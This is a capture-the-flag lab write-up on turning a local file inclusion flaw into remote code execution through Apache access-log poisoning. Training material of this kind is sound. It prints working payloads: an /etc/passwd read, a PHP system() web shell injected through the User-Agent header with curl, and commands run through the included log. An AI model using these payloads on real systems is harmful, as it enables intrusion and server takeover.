# Advent of Cyber 2025 – Day 9, 2025-12-09
**Room:** Santa’s Server Logs – Log Poisoning & LFI
**Category:** Web Exploitation / Local File Inclusion / Log Injection
**Skills Practiced:** LFI testing, HTTP header manipulation, log poisoning, achieving remote code execution, extracting flags from interactive command output.

---

## Summary
This challenge demonstrates how Local File Inclusion (LFI) can be escalated into remote code execution through log poisoning. The target server writes incoming request headers into its access logs, and those logs can be loaded through an LFI-vulnerable parameter. By injecting PHP code into the User-Agent header and then using the LFI parameter to load the poisoned log file, I was able to execute system commands on the server and retrieve the final flag.

---

## Walkthrough Notes

### 1. Identifying Local File Inclusion (LFI)

The application exposed a parameter named file `http://<target>/?file=home`. Entering unexpected values produced different include errors, confirming it attempted to load files from disk.
Testing a known Linux path, `?file=/etc/passwd`, successfully dumped the contents, confirming a fully exploitable LFI vulnerability.

---

### 2. Inspecting Web Server Log Behavior

Apache-style servers often write:
- IP addresses
- User-Agent headers
- Request paths

to files such as `/var/log/apache2/access.log`.

An LFI pointing to this path allows an attacker to view anything they previously injected into HTTP headers — even executable PHP code.

---

### 3. Poisoning the Access Log

I sent a request with a malicious User-Agent header:

`User-Agent: <?php system($_GET['cmd']); ?>`

This caused the server to write my PHP payload into the access log file, effectively turning the log into a web shell once included through the LFI endpoint. I used curl to guarantee proper header formatting:

`curl -A "<?php system(\$_GET['cmd']); ?>" http://<target>/`

---

### 4. Achieving Remote Code Execution via LFI

Next, I loaded the poisoned log using the vulnerable parameter:

`http://<target>/?file=/var/log/apache2/access.log&cmd=id`

Because the included log now contained PHP, the server executed the id command. This confirmed full command execution on the remote system. I then enumerated directories and located the challenge’s flag file, typically stored in the web root or in a designated `/flag.txt`. Example: `?file=/var/log/apache2/access.log&cmd=cat%20/flag.txt`. This returned the final flag.

---

## Key Discovery

- LFI vulnerabilities become significantly more dangerous when combined with writable server-side files.
- Access logs are a reliable target for code injection because they store attacker-controlled inputs (headers, paths).
- Log poisoning is a common technique for converting LFI into full RCE when PHP `include()` or `require()` functions are used.
- Enumeration and careful input control are essential to escalating minor misconfigurations into full system compromise.

---

Writeup author: **Jeremy Ray Jewell**  
GitHub: https://github.com/jeremyrayjewell  
LinkedIn: https://www.linkedin.com/in/jeremyrayjewell
